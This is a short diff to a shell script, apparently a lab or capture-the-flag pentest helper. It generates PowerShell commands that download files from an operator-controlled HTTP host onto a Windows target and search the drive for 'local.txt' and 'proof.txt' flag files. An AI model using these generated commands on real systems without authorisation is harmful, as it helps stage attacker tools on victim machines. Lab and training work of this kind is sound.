@@ -46,7 +46,7 @@ generate_iwr() {
         echo "HTTP IP address and port must be set before running certutil."
         return 1
     fi
-    echo "iwr -uri http://$http_ip:$http_port/$file -OutFile $outfile ;"
+    echo "if (-not (Test-Path $outfile)) { iwr -uri http://$http_ip:$http_port/$file -OutFile $outfile ; }"
 }
 
 upload_file() {
@@ -112,8 +112,7 @@ remove_return() {
     echo "$string" | tr -d '\r\n'
 }
 
-find_flag_windows() {
-    echo 'hostname;'
+find_flag_windows() {    echo 'hostname;'
     echo 'Get-ChildItem -Path C:\ -Recurse -Force -File -Include "local.txt","proof.txt" -ErrorAction SilentlyContinue| Get-Content;'
 }
 
